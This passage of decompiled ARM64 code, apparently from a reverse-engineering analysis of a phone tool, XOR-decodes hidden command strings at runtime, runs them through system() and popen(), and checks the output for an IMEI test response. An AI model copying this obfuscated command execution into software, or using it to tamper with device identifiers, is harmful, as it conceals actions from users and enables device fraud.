                                                  uVar34 >> 8) ^ bVar19,(byte)uVar34 ^ (byte)uVar15)
                                                  ))))));
    puVar9[3] = CONCAT17((byte)((ulong)uVar39 >> 0x38) ^ bVar33,
                         CONCAT16((byte)((ulong)uVar39 >> 0x30) ^ bVar32,
                                  CONCAT15((byte)((ulong)uVar39 >> 0x28) ^ bVar31,
                                           CONCAT14((byte)((ulong)uVar39 >> 0x20) ^ bVar30,
                                                    CONCAT13((byte)((ulong)uVar39 >> 0x18) ^ bVar29,
                                                             CONCAT12((byte)((ulong)uVar39 >> 0x10)
                                                                      ^ bVar28,CONCAT11((byte)((
                                                  ulong)uVar39 >> 8) ^ bVar27,
                                                  (byte)uVar39 ^ (byte)uVar4)))))));
    puVar9[2] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar25,
                         CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar24,
                                  CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar23,
                                           CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar22,
                                                    CONCAT13((byte)((ulong)uVar38 >> 0x18) ^ bVar21,
                                                             CONCAT12((byte)((ulong)uVar38 >> 0x10)
                                                                      ^ bVar20,CONCAT11((byte)((
                                                  ulong)uVar38 >> 8) ^ bVar19,
                                                  (byte)uVar38 ^ (byte)uVar15)))))));
    *(byte *)((long)puVar9 + 0x2a) = *(byte *)((long)puVar9 + 0x2a) ^ 0x19;
  }
  pcVar10 = (char *)FUN_002295c4(&DAT_00235a70);
  sVar11 = strlen(pcVar10);
  if (0xffffffffffffffef < sVar11) {
                    /* WARNING: Subroutine does not return */
    FUN_00203188(&local_180);
  }
  if (sVar11 < 0x17) {
    pvVar16 = (void *)((ulong)&local_180 | 1);
    local_180 = CONCAT71(local_180._1_7_,(char)((int)sVar11 << 1));
    if (sVar11 != 0) goto LAB_001a6a50;
  }
  else {
    uVar17 = sVar11 + 0x10 & 0xfffffffffffffff0;
    pvVar16 = (void *)FUN_00202bc0(uVar17);
    local_180 = uVar17 | 1;
    local_178 = sVar11;
    local_170 = pvVar16;
LAB_001a6a50:
    __src = (void *)FUN_002295c4(&DAT_00235a70);
    memcpy(pvVar16,__src,sVar11);
  }
  *(undefined1 *)((long)pvVar16 + sVar11) = 0;
  local_198 = 0;
  local_190 = 0;
  local_188 = (void *)0x0;
  FUN_002036bc(local_1b0,&local_180);
  iVar6 = FUN_001b6e44(param_1,local_1b0,&local_198);
  if ((local_1b0[0] & 1) != 0) {
    free(local_1a0);
  }
  if (0 < iVar6) {
    uVar18 = 0;
    goto joined_r0x001a7370;
  }
  local_168 = 0;
  sStack_160 = 0;
  sVar11 = *(size_t *)(param_2 + 8);
  pbVar7 = *(byte **)(param_2 + 0x10);
  local_158 = (void *)0x0;
  if ((*param_2 & 1) == 0) {
    pbVar7 = param_2 + 1;
    sVar11 = (ulong)(*param_2 >> 1);
  }
  if (0xffffffffffffffef < sVar11 + 1) {
                    /* WARNING: Subroutine does not return */
    FUN_00203188(&local_168);
  }
  if (sVar11 + 1 < 0x17) {
    pvVar16 = (void *)((ulong)&local_168 | 1);
    local_168 = (ulong)(byte)((int)sVar11 << 1);
    if (sVar11 != 0) goto LAB_001a6b2c;
  }
  else {
    uVar17 = sVar11 + 0x11 & 0xfffffffffffffff0;
    pvVar16 = (void *)FUN_00202bc0(uVar17);
    local_168 = uVar17 | 1;
    sStack_160 = sVar11;
    local_158 = pvVar16;
LAB_001a6b2c:
    memcpy(pvVar16,pbVar7,sVar11);
  }
  *(undefined1 *)((long)pvVar16 + sVar11) = 0;
  FUN_0020417c(&local_168,&DAT_0013e485,1);
  uVar17 = local_198 >> 1 & 0x7f;
  pvVar16 = (void *)((ulong)&local_198 | 1);
  if ((local_198 & 1) != 0) {
    uVar17 = local_190;
    pvVar16 = local_188;
  }
  puVar12 = (ulong *)FUN_0020417c(&local_168,pvVar16,uVar17);
  local_1c0 = (void *)puVar12[2];
  uStack_1c8 = puVar12[1];
  local_1d0 = *puVar12;
  puVar12[1] = 0;
  puVar12[2] = 0;
  *puVar12 = 0;
  if ((local_168 & 1) != 0) {
    free(local_158);
  }
  uVar39 = _UNK_00177528;
  uVar38 = _DAT_00177520;
  uVar36 = _UNK_00177368;
  uVar34 = _DAT_00177360;
  uVar4 = _UNK_00176c08;
  uVar15 = _DAT_00176c00;
  bVar5 = true;
  do {
    bVar3 = bVar5;
    pbVar7 = (byte *)FUN_002295c4(&DAT_00235ad0);
    if ((*pbVar7 & 1) == 0) {
      puVar9 = (undefined8 *)FUN_002295c4(&DAT_00235ab0);
      *(undefined1 *)((long)puVar9 + 0x24) = 1;
      *(undefined4 *)(puVar9 + 4) = 0xadbef58b;
      puVar9[1] = uVar39;
      *puVar9 = uVar38;
      puVar9[3] = uVar36;
      puVar9[2] = uVar34;
      FUN_002234c0(&LAB_001b3ecc,puVar9,0x2362d0);
      puVar14 = (undefined1 *)FUN_002295c4(&DAT_00235ad0);
      *puVar14 = 1;
    }
    pcVar10 = (char *)FUN_002295c4(&DAT_00235ab0);
    FUN_001b6134();
    system(pcVar10);
    uVar13 = FUN_00202bc0(8);
    FUN_0020c7ac();
    puVar9 = (undefined8 *)FUN_00202bc0(0x28);
    FUN_002036bc(&local_168,&local_1d0);
    *puVar9 = uVar13;
    puVar9[1] = &LAB_001a741c;
    puVar9[3] = sStack_160;
    puVar9[2] = local_168;
    puVar9[4] = local_158;
    iVar6 = pthread_create(&pStack_1d8,(pthread_attr_t *)0x0,FUN_001b5e04,puVar9);
    if (iVar6 != 0) {
                    /* WARNING: Subroutine does not return */
      FUN_0020c118(iVar6,"thread constructor failed");
    }
    local_168 = 200000000;
    FUN_0020c368(&local_168);
    FUN_0020c2f4(&pStack_1d8);
    local_168 = 500000000;
    FUN_0020c368(&local_168);
    pbVar7 = (byte *)FUN_002295c4(&DAT_00235cd0);
    bVar19 = (byte)uVar15;
    bVar20 = (byte)((ulong)uVar15 >> 8);
    bVar21 = (byte)((ulong)uVar15 >> 0x10);
    bVar22 = (byte)((ulong)uVar15 >> 0x18);
    bVar23 = (byte)((ulong)uVar15 >> 0x20);
    bVar24 = (byte)((ulong)uVar15 >> 0x28);
    bVar25 = (byte)((ulong)uVar15 >> 0x30);
    bVar27 = (byte)((ulong)uVar15 >> 0x38);
    bVar28 = (byte)uVar4;
    bVar29 = (byte)((ulong)uVar4 >> 8);
    bVar30 = (byte)((ulong)uVar4 >> 0x10);
    bVar31 = (byte)((ulong)uVar4 >> 0x18);
    bVar32 = (byte)((ulong)uVar4 >> 0x20);
    bVar33 = (byte)((ulong)uVar4 >> 0x28);
    bVar40 = (byte)((ulong)uVar4 >> 0x30);
    bVar41 = (byte)((ulong)uVar4 >> 0x38);
    if ((*pbVar7 & 1) == 0) {
      uVar13 = FUN_002295c4(&DAT_00235cb0);
      FUN_001b44c0(uVar13,&DAT_001794e2);
      FUN_002234c0(&LAB_001b4624,uVar13,0x2362d0);
      puVar14 = (undefined1 *)FUN_002295c4(&DAT_00235cd0);
      *puVar14 = 1;
      lVar8 = FUN_002295c4(&DAT_00235cb0);
      cVar1 = *(char *)(lVar8 + 0x2b);
    }
    else {
      lVar8 = FUN_002295c4(&DAT_00235cb0);
      cVar1 = *(char *)(lVar8 + 0x2b);
    }
    if (cVar1 != '\0') {
      puVar9 = (undefined8 *)FUN_002295c4(&DAT_00235cb0);
      *(undefined1 *)((long)puVar9 + 0x2b) = 0;
      *(byte *)(puVar9 + 4) = *(byte *)(puVar9 + 4) ^ 0x55;
      *(byte *)((long)puVar9 + 0x21) = *(byte *)((long)puVar9 + 0x21) ^ 0xd7;
      *(byte *)((long)puVar9 + 0x22) = *(byte *)((long)puVar9 + 0x22) ^ 0xa1;
      *(byte *)((long)puVar9 + 0x23) = *(byte *)((long)puVar9 + 0x23) ^ 0x75;
      *(byte *)((long)puVar9 + 0x24) = *(byte *)((long)puVar9 + 0x24) ^ 0x15;
      uVar26 = puVar9[1];
      uVar13 = *puVar9;
      uVar37 = puVar9[3];
      uVar35 = puVar9[2];
      *(byte *)((long)puVar9 + 0x25) = *(byte *)((long)puVar9 + 0x25) ^ 0x73;
      *(byte *)((long)puVar9 + 0x26) = *(byte *)((long)puVar9 + 0x26) ^ 0xbd;
      *(byte *)((long)puVar9 + 0x27) = *(byte *)((long)puVar9 + 0x27) ^ 0xa1;
      *(byte *)(puVar9 + 5) = *(byte *)(puVar9 + 5) ^ 0x55;
      *(byte *)((long)puVar9 + 0x29) = *(byte *)((long)puVar9 + 0x29) ^ 0xd7;
      puVar9[1] = CONCAT17((byte)((ulong)uVar26 >> 0x38) ^ bVar41,
                           CONCAT16((byte)((ulong)uVar26 >> 0x30) ^ bVar40,
                                    CONCAT15((byte)((ulong)uVar26 >> 0x28) ^ bVar33,
                                             CONCAT14((byte)((ulong)uVar26 >> 0x20) ^ bVar32,
                                                      CONCAT13((byte)((ulong)uVar26 >> 0x18) ^
                                                               bVar31,CONCAT12((byte)((ulong)uVar26
                                                                                     >> 0x10) ^
                                                                               bVar30,CONCAT11((byte
                                                  )((ulong)uVar26 >> 8) ^ bVar29,
                                                  (byte)uVar26 ^ bVar28)))))));
      *puVar9 = CONCAT17((byte)((ulong)uVar13 >> 0x38) ^ bVar27,
                         CONCAT16((byte)((ulong)uVar13 >> 0x30) ^ bVar25,
                                  CONCAT15((byte)((ulong)uVar13 >> 0x28) ^ bVar24,
                                           CONCAT14((byte)((ulong)uVar13 >> 0x20) ^ bVar23,
                                                    CONCAT13((byte)((ulong)uVar13 >> 0x18) ^ bVar22,
                                                             CONCAT12((byte)((ulong)uVar13 >> 0x10)
                                                                      ^ bVar21,CONCAT11((byte)((
                                                  ulong)uVar13 >> 8) ^ bVar20,(byte)uVar13 ^ bVar19)
                                                  ))))));
      puVar9[3] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar41,
                           CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar40,
                                    CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar33,
                                             CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar32,
                                                      CONCAT13((byte)((ulong)uVar37 >> 0x18) ^
                                                               bVar31,CONCAT12((byte)((ulong)uVar37
                                                                                     >> 0x10) ^
                                                                               bVar30,CONCAT11((byte
                                                  )((ulong)uVar37 >> 8) ^ bVar29,
                                                  (byte)uVar37 ^ bVar28)))))));
      puVar9[2] = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar27,
                           CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar25,
                                    CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar24,
                                             CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar23,
                                                      CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                               bVar22,CONCAT12((byte)((ulong)uVar35
                                                                                     >> 0x10) ^
                                                                               bVar21,CONCAT11((byte
                                                  )((ulong)uVar35 >> 8) ^ bVar20,
                                                  (byte)uVar35 ^ bVar19)))))));
      *(byte *)((long)puVar9 + 0x2a) = *(byte *)((long)puVar9 + 0x2a) ^ 0xa1;
    }
    pcVar10 = (char *)FUN_002295c4(&DAT_00235cb0);
    __stream = popen(pcVar10,"r");
    if (__stream != (FILE *)0x0) {
      while (pcVar10 = fgets((char *)&local_168,0x100,__stream), pcVar10 != (char *)0x0) {
        pcVar10 = strstr((char *)&local_168,"+IMEITEST:1,");
        if (pcVar10 != (char *)0x0) goto LAB_001a7304;
      }
      pclose(__stream);
    }
    local_168 = 500000000;
    FUN_0020c368(&local_168);
    pbVar7 = (byte *)FUN_002295c4(&DAT_00235cd0);
    if ((*pbVar7 & 1) == 0) {
      uVar13 = FUN_002295c4(&DAT_00235cb0);
      FUN_001b44c0(uVar13,&DAT_001794e2);
      FUN_002234c0(&LAB_001b4624,uVar13,0x2362d0);
      puVar14 = (undefined1 *)FUN_002295c4(&DAT_00235cd0);
      *puVar14 = 1;
      lVar8 = FUN_002295c4(&DAT_00235cb0);
      cVar1 = *(char *)(lVar8 + 0x2b);
    }
    else {
      lVar8 = FUN_002295c4(&DAT_00235cb0);
      cVar1 = *(char *)(lVar8 + 0x2b);
    }
    if (cVar1 != '\0') {
      puVar9 = (undefined8 *)FUN_002295c4(&DAT_00235cb0);
      *(undefined1 *)((long)puVar9 + 0x2b) = 0;
      *(byte *)(puVar9 + 4) = *(byte *)(puVar9 + 4) ^ 0x55;
      *(byte *)((long)puVar9 + 0x21) = *(byte *)((long)puVar9 + 0x21) ^ 0xd7;
      *(byte *)((long)puVar9 + 0x22) = *(byte *)((long)puVar9 + 0x22) ^ 0xa1;
      *(byte *)((long)puVar9 + 0x23) = *(byte *)((long)puVar9 + 0x23) ^ 0x75;
      *(byte *)((long)puVar9 + 0x24) = *(byte *)((long)puVar9 + 0x24) ^ 0x15;
      uVar26 = puVar9[1];
      uVar13 = *puVar9;
      uVar37 = puVar9[3];
      uVar35 = puVar9[2];
      *(byte *)((long)puVar9 + 0x25) = *(byte *)((long)puVar9 + 0x25) ^ 0x73;
      *(byte *)((long)puVar9 + 0x26) = *(byte *)((long)puVar9 + 0x26) ^ 0xbd;
      *(byte *)((long)puVar9 + 0x27) = *(byte *)((long)puVar9 + 0x27) ^ 0xa1;
      *(byte *)(puVar9 + 5) = *(byte *)(puVar9 + 5) ^ 0x55;
      *(byte *)((long)puVar9 + 0x29) = *(byte *)((long)puVar9 + 0x29) ^ 0xd7;
      puVar9[1] = CONCAT17((byte)((ulong)uVar26 >> 0x38) ^ bVar41,
                           CONCAT16((byte)((ulong)uVar26 >> 0x30) ^ bVar40,
                                    CONCAT15((byte)((ulong)uVar26 >> 0x28) ^ bVar33,
                                             CONCAT14((byte)((ulong)uVar26 >> 0x20) ^ bVar32,
                                                      CONCAT13((byte)((ulong)uVar26 >> 0x18) ^
                                                               bVar31,CONCAT12((byte)((ulong)uVar26
                                                                                     >> 0x10) ^
                                                                               bVar30,CONCAT11((byte
                                                  )((ulong)uVar26 >> 8) ^ bVar29,
                                                  (byte)uVar26 ^ bVar28)))))));
      *puVar9 = CONCAT17((byte)((ulong)uVar13 >> 0x38) ^ bVar27,
                         CONCAT16((byte)((ulong)uVar13 >> 0x30) ^ bVar25,
                                  CONCAT15((byte)((ulong)uVar13 >> 0x28) ^ bVar24,
                                           CONCAT14((byte)((ulong)uVar13 >> 0x20) ^ bVar23,
                                                    CONCAT13((byte)((ulong)uVar13 >> 0x18) ^ bVar22,
                                                             CONCAT12((byte)((ulong)uVar13 >> 0x10)
                                                                      ^ bVar21,CONCAT11((byte)((
                                                  ulong)uVar13 >> 8) ^ bVar20,(byte)uVar13 ^ bVar19)
                                                  ))))));
      puVar9[3] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar41,
                           CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar40,
                                    CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar33,
                                             CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar32,
                                                      CONCAT13((byte)((ulong)uVar37 >> 0x18) ^
                                                               bVar31,CONCAT12((byte)((ulong)uVar37
                                                                                     >> 0x10) ^
                                                                               bVar30,CONCAT11((byte
                                                  )((ulong)uVar37 >> 8) ^ bVar29,
                                                  (byte)uVar37 ^ bVar28)))))));
      puVar9[2] = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar27,
                           CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar25,
                                    CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar24,
                                             CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar23,
                                                      CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                               bVar22,CONCAT12((byte)((ulong)uVar35
                                                                                     >> 0x10) ^
                                                                               bVar21,CONCAT11((byte
                                                  )((ulong)uVar35 >> 8) ^ bVar20,
                                                  (byte)uVar35 ^ bVar19)))))));
      *(byte *)((long)puVar9 + 0x2a) = *(byte *)((long)puVar9 + 0x2a) ^ 0xa1;
    }
    pcVar10 = (char *)FUN_002295c4(&DAT_00235cb0);
    __stream = popen(pcVar10,"r");
    if (__stream != (FILE *)0x0) {
      while (pcVar10 = fgets((char *)&local_168,0x100,__stream), pcVar10 != (char *)0x0) {
        pcVar10 = strstr((char *)&local_168,"+IMEITEST:1,");
        if (pcVar10 != (char *)0x0) goto LAB_001a7304;
      }
      pclose(__stream);
    }
    local_168 = 500000000;
    FUN_0020c368(&local_168);
    pbVar7 = (byte *)FUN_002295c4(&DAT_00235cd0);
    if ((*pbVar7 & 1) == 0) {
      uVar13 = FUN_002295c4(&DAT_00235cb0);
      FUN_001b44c0(uVar13,&DAT_001794e2);
      FUN_002234c0(&LAB_001b4624,uVar13,0x2362d0);
      puVar14 = (undefined1 *)FUN_002295c4(&DAT_00235cd0);
      *puVar14 = 1;
      lVar8 = FUN_002295c4(&DAT_00235cb0);
      cVar1 = *(char *)(lVar8 + 0x2b);
    }
    else {
      lVar8 = FUN_002295c4(&DAT_00235cb0);
      cVar1 = *(char *)(lVar8 + 0x2b);
    }
    if (cVar1 != '\0') {
      puVar9 = (undefined8 *)FUN_002295c4(&DAT_00235cb0);
      *(undefined1 *)((long)puVar9 + 0x2b) = 0;
      *(byte *)(puVar9 + 4) = *(byte *)(puVar9 + 4) ^ 0x55;
      *(byte *)((long)puVar9 + 0x21) = *(byte *)((long)puVar9 + 0x21) ^ 0xd7;
      *(byte *)((long)puVar9 + 0x22) = *(byte *)((long)puVar9 + 0x22) ^ 0xa1;
      *(byte *)((long)puVar9 + 0x23) = *(byte *)((long)puVar9 + 0x23) ^ 0x75;
      *(byte *)((long)puVar9 + 0x24) = *(byte *)((long)puVar9 + 0x24) ^ 0x15;
      uVar26 = puVar9[1];
      uVar13 = *puVar9;
      uVar37 = puVar9[3];
      uVar35 = puVar9[2];
      *(byte *)((long)puVar9 + 0x25) = *(byte *)((long)puVar9 + 0x25) ^ 0x73;
      *(byte *)((long)puVar9 + 0x26) = *(byte *)((long)puVar9 + 0x26) ^ 0xbd;
      *(byte *)((long)puVar9 + 0x27) = *(byte *)((long)puVar9 + 0x27) ^ 0xa1;
      *(byte *)(puVar9 + 5) = *(byte *)(puVar9 + 5) ^ 0x55;
      *(byte *)((long)puVar9 + 0x29) = *(byte *)((long)puVar9 + 0x29) ^ 0xd7;
      puVar9[1] = CONCAT17((byte)((ulong)uVar26 >> 0x38) ^ bVar41,
                           CONCAT16((byte)((ulong)uVar26 >> 0x30) ^ bVar40,
                                    CONCAT15((byte)((ulong)uVar26 >> 0x28) ^ bVar33,
                                             CONCAT14((byte)((ulong)uVar26 >> 0x20) ^ bVar32,
                                                      CONCAT13((byte)((ulong)uVar26 >> 0x18) ^
                                                               bVar31,CONCAT12((byte)((ulong)uVar26
                                                                                     >> 0x10) ^
                                                                               bVar30,CONCAT11((byte
                                                  )((ulong)uVar26 >> 8) ^ bVar29,
                                                  (byte)uVar26 ^ bVar28)))))));
      *puVar9 = CONCAT17((byte)((ulong)uVar13 >> 0x38) ^ bVar27,
                         CONCAT16((byte)((ulong)uVar13 >> 0x30) ^ bVar25,
                                  CONCAT15((byte)((ulong)uVar13 >> 0x28) ^ bVar24,
                                           CONCAT14((byte)((ulong)uVar13 >> 0x20) ^ bVar23,
                                                    CONCAT13((byte)((ulong)uVar13 >> 0x18) ^ bVar22,
                                                             CONCAT12((byte)((ulong)uVar13 >> 0x10)
                                                                      ^ bVar21,CONCAT11((byte)((
                                                  ulong)uVar13 >> 8) ^ bVar20,(byte)uVar13 ^ bVar19)
                                                  ))))));
      puVar9[3] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar41,
                           CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar40,
                                    CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar33,
                                             CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar32,
                                                      CONCAT13((byte)((ulong)uVar37 >> 0x18) ^
                                                               bVar31,CONCAT12((byte)((ulong)uVar37
                                                                                     >> 0x10) ^
                                                                               bVar30,CONCAT11((byte
                                                  )((ulong)uVar37 >> 8) ^ bVar29,
                                                  (byte)uVar37 ^ bVar28)))))));
      puVar9[2] = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar27,
                           CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar25,
                                    CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar24,
                                             CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar23,
                                                      CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                               bVar22,CONCAT12((byte)((ulong)uVar35
                                                                                     >> 0x10) ^
                                                                               bVar21,CONCAT11((byte
                                                  )((ulong)uVar35 >> 8) ^ bVar20,
                                                  (byte)uVar35 ^ bVar19)))))));
      *(byte *)((long)puVar9 + 0x2a) = *(byte *)((long)puVar9 + 0x2a) ^ 0xa1;
    }
    pcVar10 = (char *)FUN_002295c4(&DAT_00235cb0);
    __stream = popen(pcVar10,"r");
    if (__stream != (FILE *)0x0) {
      while (pcVar10 = fgets((char *)&local_168,0x100,__stream), pcVar10 != (char *)0x0) {
        pcVar10 = strstr((char *)&local_168,"+IMEITEST:1,");
        if (pcVar10 != (char *)0x0) goto LAB_001a7304;
      }
      pclose(__stream);
    }
    local_168 = 500000000;
    FUN_0020c368(&local_168);
    pbVar7 = (byte *)FUN_002295c4(&DAT_00235cd0);
    if ((*pbVar7 & 1) == 0) {
      uVar13 = FUN_002295c4(&DAT_00235cb0);
      FUN_001b44c0(uVar13,&DAT_001794e2);
      FUN_002234c0(&LAB_001b4624,uVar13,0x2362d0);
      puVar14 = (undefined1 *)FUN_002295c4(&DAT_00235cd0);
      *puVar14 = 1;
      lVar8 = FUN_002295c4(&DAT_00235cb0);
      cVar1 = *(char *)(lVar8 + 0x2b);
    }
    else {
      lVar8 = FUN_002295c4(&DAT_00235cb0);
      cVar1 = *(char *)(lVar8 + 0x2b);
    }
    if (cVar1 != '\0') {
      puVar9 = (undefined8 *)FUN_002295c4(&DAT_00235cb0);
      *(undefined1 *)((long)puVar9 + 0x2b) = 0;
      *(byte *)(puVar9 + 4) = *(byte *)(puVar9 + 4) ^ 0x55;
      *(byte *)((long)puVar9 + 0x21) = *(byte *)((long)puVar9 + 0x21) ^ 0xd7;
      *(byte *)((long)puVar9 + 0x22) = *(byte *)((long)puVar9 + 0x22) ^ 0xa1;
      *(byte *)((long)puVar9 + 0x23) = *(byte *)((long)puVar9 + 0x23) ^ 0x75;
      *(byte *)((long)puVar9 + 0x24) = *(byte *)((long)puVar9 + 0x24) ^ 0x15;
      uVar26 = puVar9[1];
      uVar13 = *puVar9;
      uVar37 = puVar9[3];
      uVar35 = puVar9[2];
      *(byte *)((long)puVar9 + 0x25) = *(byte *)((long)puVar9 + 0x25) ^ 0x73;
      *(byte *)((long)puVar9 + 0x26) = *(byte *)((long)puVar9 + 0x26) ^ 0xbd;
      *(byte *)((long)puVar9 + 0x27) = *(byte *)((long)puVar9 + 0x27) ^ 0xa1;
      *(byte *)(puVar9 + 5) = *(byte *)(puVar9 + 5) ^ 0x55;
      *(byte *)((long)puVar9 + 0x29) = *(byte *)((long)puVar9 + 0x29) ^ 0xd7;
      puVar9[1] = CONCAT17((byte)((ulong)uVar26 >> 0x38) ^ bVar41,
                           CONCAT16((byte)((ulong)uVar26 >> 0x30) ^ bVar40,
                                    CONCAT15((byte)((ulong)uVar26 >> 0x28) ^ bVar33,
                                             CONCAT14((byte)((ulong)uVar26 >> 0x20) ^ bVar32,
                                                      CONCAT13((byte)((ulong)uVar26 >> 0x18) ^
                                                               bVar31,CONCAT12((byte)((ulong)uVar26
                                                                                     >> 0x10) ^
                                                                               bVar30,CONCAT11((byte
                                                  )((ulong)uVar26 >> 8) ^ bVar29,
                                                  (byte)uVar26 ^ bVar28)))))));
      *puVar9 = CONCAT17((byte)((ulong)uVar13 >> 0x38) ^ bVar27,
                         CONCAT16((byte)((ulong)uVar13 >> 0x30) ^ bVar25,
                                  CONCAT15((byte)((ulong)uVar13 >> 0x28) ^ bVar24,
                                           CONCAT14((byte)((ulong)uVar13 >> 0x20) ^ bVar23,
                                                    CONCAT13((byte)((ulong)uVar13 >> 0x18) ^ bVar22,
                                                             CONCAT12((byte)((ulong)uVar13 >> 0x10)
                                                                      ^ bVar21,CONCAT11((byte)((
                                                  ulong)uVar13 >> 8) ^ bVar20,(byte)uVar13 ^ bVar19)
                                                  ))))));
      puVar9[3] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar41,
                           CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar40,
                                    CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar33,
                                             CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar32,
                                                      CONCAT13((byte)((ulong)uVar37 >> 0x18) ^
                                                               bVar31,CONCAT12((byte)((ulong)uVar37
                                                                                     >> 0x10) ^
                                                                               bVar30,CONCAT11((byte
                                                  )((ulong)uVar37 >> 8) ^ bVar29,
                                                  (byte)uVar37 ^ bVar28)))))));
      puVar9[2] = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar27,
                           CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar25,
                                    CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar24,
                                             CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar23,
                                                      CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                               bVar22,CONCAT12((byte)((ulong)uVar35
                                                                                     >> 0x10) ^
                                                                               bVar21,CONCAT11((byte
                                                  )((ulong)uVar35 >> 8) ^ bVar20,
                                                  (byte)uVar35 ^ bVar19)))))));
      *(byte *)((long)puVar9 + 0x2a) = *(byte *)((long)puVar9 + 0x2a) ^ 0xa1;
    }
    pcVar10 = (char *)FUN_002295c4(&DAT_00235cb0);
    __stream = popen(pcVar10,"r");
    if (__stream != (FILE *)0x0) {
      while (pcVar10 = fgets((char *)&local_168,0x100,__stream), pcVar10 != (char *)0x0) {
        pcVar10 = strstr((char *)&local_168,"+IMEITEST:1,");
        if (pcVar10 != (char *)0x0) goto LAB_001a7304;
      }
      pclose(__stream);
    }
    FUN_0020c284(&pStack_1d8);
    uVar18 = 0;
    bVar5 = false;
  } while (bVar3);
LAB_001a7318:
  if ((local_1d0 & 1) != 0) {
    free(local_1c0);
  }
joined_r0x001a7370:
  if ((local_198 & 1) != 0) {
    free(local_188);
  }
  if ((local_180 & 1) == 0) {
    if (*(long *)(lVar2 + 0x28) == local_68) {
      return uVar18;
    }
  }
  else {
    free(local_170);
    if (*(long *)(lVar2 + 0x28) == local_68) {
      return uVar18;
    }
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
LAB_001a7304:
  pclose(__stream);
  FUN_0020c284(&pStack_1d8);
  uVar18 = 1;
  goto LAB_001a7318;
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_001a55a8
 * Purpose (EN): Threaded Execution Controller
 * Purpose (AR): إنشاء مسار معالجة خلفي لتنفيذ الأوامر بأمان
 */

// Function: FUN_001a55a8 @ 001a55a8
// ----------------------------------------------------------------

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

uint FUN_001a55a8(void)

{
  long lVar1;
  undefined8 uVar2;
  undefined8 uVar3;
  undefined8 uVar4;
  int iVar5;
  uint uVar6;
  byte *pbVar7;
  undefined8 uVar8;
  ulong uVar9;
  undefined8 *puVar10;
  undefined1 *puVar11;
  pthread_t local_30;
  long local_28;
  
  lVar1 = tpidr_el0;
  local_28 = *(long *)(lVar1 + 0x28);
  pbVar7 = (byte *)FUN_002295c4(&DAT_00234b90);
  if ((*pbVar7 & 1) == 0) {
    puVar10 = (undefined8 *)FUN_002295c4(&DAT_00234b70);
    uVar4 = _UNK_00177358;
    uVar3 = _DAT_00177350;
    uVar2 = _UNK_001771d8;
    uVar8 = _DAT_001771d0;
    *(undefined4 *)(puVar10 + 4) = 0x6fb4fd50;
    *(undefined2 *)((long)puVar10 + 0x24) = 0x167;
    puVar10[1] = uVar4;
    *puVar10 = uVar3;
    puVar10[3] = uVar2;
    puVar10[2] = uVar8;
    FUN_002234c0(&LAB_001ac624,puVar10,0x2362d0);
    puVar11 = (undefined1 *)FUN_002295c4(&DAT_00234b90);
    *puVar11 = 1;
  }
  uVar8 = FUN_002295c4(&DAT_00234b70);
  FUN_001ac634();
  uVar9 = FUN_001a50c4(uVar8);
  if ((uVar9 & 1) == 0) {
    uVar6 = 0;
    if (*(long *)(lVar1 + 0x28) == local_28) goto LAB_001a5788;
  }
  else {
    uVar8 = FUN_00202bc0(8);
    FUN_0020c7ac();
    puVar10 = (undefined8 *)FUN_00202bc0(8);
    *puVar10 = uVar8;
    iVar5 = pthread_create(&local_30,(pthread_attr_t *)0x0,(__start_routine *)&LAB_001ac6a8,puVar10)
    ;
    if (iVar5 != 0) {
                    /* WARNING: Subroutine does not return */
      FUN_0020c118(iVar5,"thread constructor failed");
    }
    FUN_0020c2f4(&local_30);
    FUN_0020c284(&local_30);
    local_30 = 500000000;
    FUN_0020c368(&local_30);
    uVar9 = FUN_001a4d04();
    if ((uVar9 & 1) == 0) {
      local_30 = 500000000;
      FUN_0020c368(&local_30);
      uVar9 = FUN_001a4d04();
      if ((uVar9 & 1) == 0) {
        local_30 = 500000000;
        FUN_0020c368(&local_30);
        uVar9 = FUN_001a4d04();
        if ((uVar9 & 1) == 0) {
          local_30 = 500000000;
          FUN_0020c368(&local_30);
          uVar9 = FUN_001a4d04();
          if ((uVar9 & 1) == 0) {
            local_30 = 500000000;
